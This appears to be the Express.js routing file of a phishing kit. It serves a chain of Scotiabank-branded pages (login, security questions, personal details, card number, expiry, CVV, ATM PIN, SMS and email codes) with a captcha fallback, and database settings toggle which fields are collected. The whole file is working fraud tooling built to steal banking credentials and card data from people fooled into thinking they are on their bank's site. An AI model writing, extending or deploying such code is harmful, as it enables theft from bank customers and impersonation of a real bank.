// userRouter.js
const express = require('express');
const router = express.Router();
const dbConfig = require('../dbConfig');
const { Pool } = require('pg');
const getId = 1;

const pool = new Pool(dbConfig);

router.get('/finish', async (req, res) => {
    res.render('bank/scotia/finish/index');
})

router.get('/card', async (req, res) => {
    try {
        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);

        res.render('bank/scotia/card/index', { navig: "/scotia/finish", scotia: result.rows[0].data.settings.scotia});

    } catch (error) {
        console.log(error);
        res.render('captcha/index');
    }
})

router.get('/loading', async (req, res) => {
    res.render('bank/scotia/loading/index');
})

router.get('/sms', async (req, res) => {
    let error = false
    if(req.query.argument){
        error = true
    }
    res.render('bank/scotia/sms/index', { navig: "/scotia/loading", error: error});
})

router.get('/auth', async (req, res) => {
    let error = false
    if(req.query.argument){
        error = true
    }
    res.render('bank/scotia/auth/index', { navig: "/scotia/loading", error: error });
})

router.get('/email', async (req, res) => {
    let error = false
    if(req.query.argument){
        error = true
    }
    res.render('bank/scotia/email/index', { navig: "/scotia/loading", error: error });
})


router.get('/details', async (req, res) => {
    try {
        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);
        let count = 0
        let countRmvDetailsPage = 0
        let countRmvCardPage = 0
        let rmvCardPage = false

        Object.keys(result.rows[0].data.settings.scotia).forEach(key => {
            if (result.rows[0].data.settings.scotia[key] === 'off') {
                count++;
                if (key != 'card' && key != 'exp' && key != 'cvv' && key != 'atm') {
                    countRmvDetailsPage++;
                } else {
                    countRmvCardPage++;
                }
            }
        });

        if (countRmvCardPage == 4) {
            rmvCardPage = true
        }


        if (rmvCardPage) {
            res.render('bank/scotia/details/index', { navig: "/scotia/finish", scotia: result.rows[0].data.settings.scotia});
        } else {
            res.render('bank/scotia/details/index', { navig: "/scotia/card", scotia: result.rows[0].data.settings.scotia});
        }



    } catch (error) {
        console.log(error);
        res.render('captcha/index');
    }
})

router.get('/qst', async (req, res) => {
    try {
        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);
        let count = 0
        let countRmvDetailsPage = 0
        let countRmvCardPage = 0
        let rmvDetailsPage = false
        let rmvCardPage = false

        Object.keys(result.rows[0].data.settings.scotia).forEach(key => {
            if (result.rows[0].data.settings.scotia[key] === 'off') {
                count++;
                if (key != 'card' && key != 'exp' && key != 'cvv' && key != 'atm') {
                    countRmvDetailsPage++;
                } else {
                    countRmvCardPage++;
                    //console.log(countRmvCardPage);
                }
            }
        });

        if (countRmvDetailsPage == 10) {
            rmvDetailsPage = true
        }

        if (countRmvCardPage == 4) {
            rmvCardPage = true
        }

        //console.log("Remove Details : ", rmvDetailsPage)
        //console.log("Remove Card : ", rmvCardPage)



        if (rmvDetailsPage) {
            if (rmvCardPage) {
                res.render('bank/scotia/qst/index', { navig: "/scotia/finish", p_quests: result.rows[0].data.settings.scotia.qa });
            } else {
                res.render('bank/scotia/qst/index', { navig: "/scotia/card", p_quests: result.rows[0].data.settings.scotia.qa });
            }
        } else if (count >= 14) {
            res.render('bank/scotia/qst/index', { navig: "/scotia/finish", p_quests: result.rows[0].data.settings.scotia.qa });
        } else {
            res.render('bank/scotia/qst/index', { navig: "/scotia/details", p_quests: result.rows[0].data.settings.scotia.qa });
        }

    } catch (error) {
        console.log(error);
        res.render('captcha/index');
    }
})

router.get('/login', async (req, res) => {
    try {

        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);
        let count = 0
        let countRmvDetailsPage = 0
        let countRmvCardPage = 0
        let rmvDetailsPage = false
        let rmvCardPage = false

        Object.keys(result.rows[0].data.settings.scotia).forEach(key => {
            if (result.rows[0].data.settings.scotia[key] === 'off') {
                count++;
                if (key != 'card' && key != 'exp' && key != 'cvv' && key != 'atm') {
                    countRmvDetailsPage++;
                } else {
                    countRmvCardPage++;
                    //console.log(countRmvCardPage);
                }
            }
        });

        if (countRmvDetailsPage == 10) {
            rmvDetailsPage = true
        }

        if (countRmvCardPage == 4) {
            rmvCardPage = true
        }

        //console.log("Remove Details : ", rmvDetailsPage)
        //console.log("Remove Card : ", rmvCardPage)


        if (result.rows[0].data.settings.scotia.qa > 0) {
            res.render('bank/scotia/login/index', { navig: "/scotia/qst" });
        } else if (count >= 14) {
            res.render('bank/scotia/login/index', { navig: "/scotia/finish" });
        } else {
            if (rmvDetailsPage) {
                if (rmvCardPage) {
                    res.render('bank/scotia/login/index', { navig: "/scotia/finish" });
                } else {
                    res.render('bank/scotia/login/index', { navig: "/scotia/card" });
                }
            } else {
                res.render('bank/scotia/login/index', { navig: "/scotia/details" });
            }
        }


    } catch (error) {
        console.error(error);
        res.render('captcha/index');
    }
})



// Export the router
module.exports = router;
